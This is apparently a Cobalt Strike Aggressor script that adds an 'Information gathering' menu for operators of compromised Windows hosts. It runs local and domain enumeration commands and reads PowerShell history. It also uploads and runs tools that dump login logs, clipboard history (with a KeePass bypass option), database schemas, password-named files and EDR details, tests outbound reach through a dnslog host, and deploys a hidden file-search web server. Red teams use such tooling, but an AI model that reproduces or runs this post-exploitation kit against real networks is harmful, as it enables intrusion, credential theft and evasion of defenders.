menu "Information gathering" {
	menu "Common commands for stand-alone" {
		item "systeminfo" {
			$bid = $1['@'];
			bshell($bid, "systeminfo");
		}
		item "whoami /all" {
			$bid = $1['@'];
			bshell($bid, "whoami /all");
		}
		item "ipconfig /all" {
			$bid = $1['@'];
			bshell($bid, "ipconfig /all");
		}
		item "View routing table" {
			$bid = $1['@'];
			bshell($bid, "route print");
		}
		item "View arp cache" {
			$bid = $1['@'];
			bshell($bid, "arp -A");
		}
		item "View user information" {
			$bid = $1['@'];
			bshell($bid, "net user");
		}
		item "View installer and version information" {
			$bid = $1['@'];
			bshell($bid, "wmic product get name,version");
		}
		item "View installed patches" {
			$bid = $1['@'];
			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
		}
		item "View running processes and paths" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,executablepath,commandline");
		}
		item "View process details" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,commandline,processid /value");
		}
		item "View process details" {
			$bid = $1['@'];
			bshell($bid, "wmic service list brief");
		}
		item "View process details" {
			$bid = $1['@'];
			bshell($bid, "netsh firewall show config");
		}
		item "View scheduled tasks" {
			$bid = $1['@'];
			bshell($bid, "schtasks.exe");
		}
		item "View scheduled task details" {
			$bid = $1['@'];
			bshell($bid, "schtasks /query /fo LIST /v");
		}
		item "View launcher information" {
			$bid = $1['@'];
			bshell($bid, "wmic startup get command,caption");
		}
		item "View online users" {
			$bid = $1['@'];
			bshell($bid, "query user || qwinsta");
		}
		item "View boot time" {
			$bid = $1['@'];
			bshell($bid, "net statistics workstation");
		}
		item "View powershell v5 history commands" {
			$bid = $1['@'];
			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
		}
		item "View recently used items" {
			$bid = $1['@'];
			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
		}
		item "View SMB pointing path" {
			$bid = $1['@'];
			bshell($bid, "wmic share get name,path");
		}
	}


	menu "Common commands in domain environment" {
		menu "AdFind(Query domain information)" {
			item "Upload AdFind" {
				$bid = $1;
				$dialog = dialog("Upload AdFind", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &AdFind_upload);
				dialog_description($dialog,"AdFindUsed to query information in the domain. Project address：http://www.joeware.net/freetools/tools/adfind/index.htm");
				drow_text($dialog, "UploadPath",  "Upload path: ");
				dbutton_action($dialog, "upload");
				dialog_show($dialog);
			}
			sub AdFind_upload {
				bcd($bid, $3['UploadPath']);
				bupload($bid, script_resource("/scripts/Information collection/AdFind.exe"));
			}
			item "List domain controller names" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc dclist");
			}
			item "Query online computers in the current domain" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active");
			}
			item "Query online computers in the current domain)" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
			}
			item "Query all computers in the current domain" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
			}
			item "Query all computers in the current domain(Only show name and operating system)" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
			}
			item "Query all users in the domain" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -users name");
			}
			item "Query all GPOs" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc gpodmp");
			}
			item "Remove AdFind" {
				$bid = $1['@'];
				bshell($bid, "del /f /s /q AdFind.exe");
			}
		}

		item "Query domain" {
			$bid = $1['@'];
			bshell($bid, "net view /domain");
		}
		item "View domain management" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain admins\" /domain");
		}
		item "View domain user details" {
			prompt_text("Enter domain username", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
		}
		item "View current login domain" {
			$bid = $1['@'];
			bshell($bid, "net config workstation");
		}
		item "View time server" {
			$bid = $1['@'];
			bshell($bid, "net time /domain");
		}
		item "Display a list of computers in the current domain" {
			$bid = $1['@'];
			bshell($bid, "net view");
		}
		item "View the domain management of this machine" {
			$bid = $1['@'];
			bshell($bid, "net localgroup administrators /domain");
		}
		item "View all domain users" {
			$bid = $1['@'];
			bshell($bid, "net user /domain");
		}
		item "View the list of all user groups in the domain" {
			$bid = $1['@'];
			bshell($bid, "net group /domain");
		}
		item "View primary domain controller" {
			$bid = $1['@'];
			bshell($bid, "netdom query pdc");
		}
		item "View domain control list" {
			$bid = $1['@'];
			bshell($bid, "net group \"Domain Controllers\" /domain");
		}
		item "View domain controller host name" {
			$bid = $1['@'];
			bshell($bid, "Nslookup -type=SRV _ldap._tcp");
		}
		item "Get domain trust information" {
			$bid = $1['@'];
			bshell($bid, "nltest /domain_trusts");
		}
		item "Get domain password information" {
			$bid = $1['@'];
			bshell($bid, "net accounts /domain");
		}
		item "View a list of all domain member computers" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain computers\" /domain");
		}
		item "View all computers in the domain" {
			prompt_text("Enter hostname", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
		}

	}

	item "SharpChassisType(Determine the host type)" {
		$bid = $1['@'];
		$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
		dialog_description($dialog,"Used to determine the current machine type(Desktop computer, Notebook, etc. judgment)。Project address：https://github.com/RcoIl/CSharp-Tools/");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpChassisType{
	    bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpChassisType.exe"), "");
	}

	item "SharpNetCheck(Detect out the net)" {
		$bid = $1['@'];
		$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
		dialog_description($dialog,"In the process of intranet penetration，Desire for machines that can go online. In the case of collecting a large number of weak passwords, it is too troublesome to test whether one can go online. So there is this tool, which can be used with horizontal tools such as wmiexec, psexec and other horizontal tools to perform batch detection. This tool can echo the intranet ip address and computer name in dnslog, which can realize the rapid positioning of outbound machines in the intranet. project address：https://github.com/uknowsec/SharpNetCheck");
		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
		drow_text($dialog, "host", "host/ip:  ");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpNetCheck {
		$arg = join(' ', @($3['type'],"-host",$3['host']));
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpNetCheck.exe"), $arg);
	}

	item "SharpEventLog(Get system login log)" {
		$bid = $1;
		$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
		dialog_description($dialog, "Read all computer information that has failed to log in to this machine or successfully logged in (4624, 4625), and quickly locate operation and maintenance managers in the intranet penetration. Project address：https://github.com/uknowsec/SharpEventLog");
		drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpEventLog {
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpEventLog.exe"), $3['EventLogType']);
	}

	item "SharpCheckInfo(Get multiple host information)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
		dialog_description($dialog, "Collect target host information, including recently opened files, system environment variables and recycle bin files, etc. project address：https://github.com/uknowsec/SharpCheckInfo");
		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpCheckInfo {
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpCheckInfo.exe"), $3['Type']);
	}

	item "SharpSQLDump(Quickly list database data)" {
		$bid = $1['@'];
		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
		dialog_description($dialog, "Quickly obtain all database names, table names, and column names in the database during intranet penetration. Go through the data after specific judgments to save time. Applicable to mysql, mssql. Project address：https://github.com/uknowsec/SharpSQLDump");
		drow_text($dialog, "host", "host:  ");
		drow_text($dialog, "username", "username:  ");
		drow_text($dialog, "password", "password:  ");
		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpSQLDump {
		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpSQLDump.exe"), $arg);
	}

	item "SharpClipHistory(Get win10 clipboard)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
		dialog_description($dialog, "It can be used to read the contents of the user's clipboard history in Windows 10 starting from the 1809 Build version. The blank type option means read. Project address：https://github.com/FSecureLABS/SharpClipHistory");
		drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpClipHistory {
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpClipHistory.exe"), $3['Type']);
	}

	item "SharpAVKB(Anti-virus and patch comparison)" {
		$bid = $1;
		$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
		dialog_description($dialog, "Windows anti-software comparison and patch number comparison. Project address：https://github.com/uknowsec/SharpAVKB");
		drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpAVKB {
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpAVKB.exe"), $3['type']);
	}

	item "SharpEDRChecker(Obtain EDR information)" {
		$bid = $1['@'];
		btask($bid, "Check the running process, process metadata, Dll loaded into the current process and each DLL metadata, common installation directory, installed services and binary metadata for each service, installed drivers and each driver Metadata, all of which exist for known defensive products such as AV, EDR, and logging tools. It can also capture hidden EDR through its metadata check. Project address：https://github.com/PwnDexter/SharpEDRChecker", "");
		bexecute_assembly($1, script_resource("/scripts/Information collection/SharpEDRChecker.exe"), "");
	}

	item "SharpDir(File search)" {
		$bid = $1['@'];
		$dialog = dialog("File search", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
		dialog_description($dialog, "File search, three search methods, specify file name, specify file name search suffix, search specified suffix file. Project address：https://github.com/jnqpblc/SharpDir");
		drow_text($dialog, "path", "path:  ");
		drow_text($dialog, "file", "file:  ");
		dbutton_action($dialog, "run");
		dialog_show($dialog);
	}
	sub SharpDir {
		$arg = join(' ', @($3['path'],$3['file']));
		bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpDir.exe"), $arg);
	}

	menu "Everything(Build http service file search)" {
		item "Upload everything" {
			$bid = $1;
			$dialog = dialog("Upload Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
			dialog_description($dialog, "Run without any pop-up window, software address：https://www.voidtools.com/zh-cn/");
			drow_text($dialog, "UploadPath",  "Upload path: ");
			dbutton_action($dialog, "Upload");
			dialog_show($dialog);
		}
		sub evething {
			bcd($bid, $3['UploadPath']);
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/scripts/Information collection/x64/Everything.exe"));
				bupload($bid, script_resource("/scripts/Information collection/x64/Everything.ini"));
			}else{
				bupload($bid, script_resource("/scripts/Information collection/x86/Everything.exe"));
				bupload($bid, script_resource("/scripts/Information collection/x86/Everything.ini"));
			}
		}

		item "Run everything"{
			$bid = $1['@'];
			$Dialog = dialog("Run everything",%(bid => $bid),&Evething_run);
			dialog_description($Dialog, "Run without any pop-up window and tray display，Automatically enable http service. port：65536，user：admin，password：admin@123");
			dbutton_action($Dialog, "run");
			dialog_show($Dialog);
		}
		sub Evething_run{
			bshell($bid, "Everything.exe");
		}
		item "Stop everything"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im Everything.exe");
			}
		}
		item "Remove everything"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
			}
		}
	}
}
